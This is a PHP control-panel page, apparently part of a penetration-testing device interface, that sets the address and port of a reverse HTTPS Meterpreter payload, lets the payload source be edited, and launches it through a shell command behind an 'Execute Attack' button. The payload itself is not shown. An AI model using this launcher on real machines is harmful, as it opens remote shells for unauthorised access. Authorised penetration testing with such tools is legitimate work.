<?php
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
switch ($lang){
  case "fr":
    $lang="fr_FR";
    break;
  default:
    $lang="C";
    break;
}

$values = array('rhost', 'rport');
if (isset($_POST['action']) && $_POST['action'] == 'update' && isset($_POST['tab']) && $_POST['tab'] == 'rmhttpspayload'):
	$con = file_get_contents($files['reverse-https']['path']);
	foreach ($values as $k => $v):
		if (isset($_POST[$v])):
			if ((int)$k === 0):
				$new_ip = strip_tags(trim($_POST[$v]));
				if (filter_var($new_ip, FILTER_VALIDATE_IP)):
					$tmp = explode('.', $new_ip);
					$new_value = '$'.$v." = ";
					$tmp =  str_split($new_ip);
					foreach ($tmp as $m => $p):
						if ($p == '.') {
							$new_value .= "0x2e";
						} else {
							$new_value .= "0x".ascii2hex($p);
						}					
						if ((int) $m < (count($tmp)-1)):
							$new_value .= ",";
						else:
							$new_value .= ",0x00;";
						endif;
					endforeach;
					$con = preg_replace('/\$'.$v.' = (.*)$/m', $new_value, $con);
				endif;
			elseif ((int) $k === 1):
				$new_port = (int) $_POST[$v];
				if ($new_port >= 0 && $new_port <= 65535):
					$new_hex = dechex($new_port);
					$splited = str_split($new_hex, 2);
					$new_value = '$'.$v." = ";
					foreach ($splited as $s => $pl):
						$new_value .= '0x'.$pl;
						if ((int) $s < (count($splited)-1)):
							$new_value .= ",";
						else:
							$new_value .= ";";
						endif;
					endforeach;
					$con = preg_replace('/\$'.$v.' = (.*)$/m', $new_value, $con);
				endif;
			endif;
		endif;
	endforeach;
	file_put_contents($files['reverse-https']['path'], $con);
	$message = 'Options updated!';
elseif (isset($_POST['action']) && $_POST['action'] === 'updateSource' && isset($_POST['tab']) && $_POST['tab'] == 'rmhttpspayload'):
	$new_source = trim(strip_tags($_POST['source']));
	file_put_contents($files['reverse-https']['path'], $new_source);
	$message = 'Source updated!';
elseif (isset($_GET['action']) && $_GET['action'] === 'execute' && isset($_GET['tab']) && $_GET['tab'] == 'rmhttpspayload'):
	$res = shell_exec("LANG=$lang start-rev-met-http");
	$message = 'Attack executed!';
endif;

$con = file_get_contents($files['reverse-https']['path']);
foreach ($values as $v):
	preg_match( '/\$'.$v.' = (.*)$/m', $con, $match );
	if (isset($match[1])):
		$$v = $match[1];
	else:
		$$v = '';
	endif;
endforeach;
?>
<?php require dirname(__FILE__).'/messages.php';?>
<ul class="nav nav-tabs" role="tablist">
	<li class="active"><a href="#optionsrmhttpspayload" role="tab" data-toggle="tab">Options</a></li>
	<li class=""><a href="#sourcermhttpspayload" role="tab" data-toggle="tab">Source</a></li>  				
</ul>
<div class="tab-content">
	<div id="optionsrmhttpspayload" class="tab-pane fade in active">
		<form action="index.php#rmhttpspayload" method="POST">
			<input type="hidden" name="action" value="update" />
			<input type="hidden" name="tab" value="rmhttpspayload" />
			<input type="hidden" name="k" value="hid" />
			<?php foreach ($values as $k => $v):?>
				<?php if ((int) $k === 0):?>
					<?php 
					$tmp1 = str_replace('0x00;', '', $$v);
					$tmp = explode(",", trim($tmp1, ','));
					$ip = '';
					foreach ($tmp as $y => $i):
						if ($i == '0x2e'):
							$ip .=".";
						else:
							$ip .= hexdec(substr($i, 3));
						endif;
					endforeach;
					$$v = $ip;
					?>
				<?php else: ?>
					<?php 
					$tmp = explode(",", trim($$v, ';'));
					$hex ='';
					foreach ($tmp as $y => $i):
						$hex.=str_replace("0x", '', $i);
					endforeach;
					$$v = hexdec($hex);
					?>
				<?php endif; ?>
				<div class="form-group">
					<label for="input-<?php echo $v;?>"><?php if ((int) $k === 0): echo "address"; elseif((int) $k===1): echo "port"; else: echo $v; endif;?></label>
					<input id="input-<?php echo $v;?>" class="form-control" type="text" name="<?php echo $v;?>" placeholder="<?php echo $v;?>" value="<?php echo $$v;?>" />
				</div>
			<?php endforeach;?>
			<input class="btn btn-primary btn-sm" type="submit" value="Update" name="commit">
			<a href="index.php?k=<?php echo $selected_k;?>&action=execute&tab=rmhttpspayload#rmhttpspayload"><input class="btn btn-success btn-sm" type="button" value="Execute Attack" name="commit"></a>
		</form>
	</div>
	<div id="sourcermhttpspayload" class="tab-pane fade in">
		<form action="index.php#rmhttpspayload" method="POST">
			<input type="hidden" name="k" value="hid" />
			<input type="hidden" name="tab" value="rmhttpspayload" />
			<input type="hidden" name="action" value="updateSource" />
			<div class="form-group">		
				<textarea name="source" id="input-source" class="form-control panel-body md-input" rows="20"><?php echo $con;?></textarea>
			</div>
			<input class="btn btn-primary btn-sm" type="submit" value="Update source" name="commit">
		</form>
	</div>
</div> <!-- end of .tab-content -->
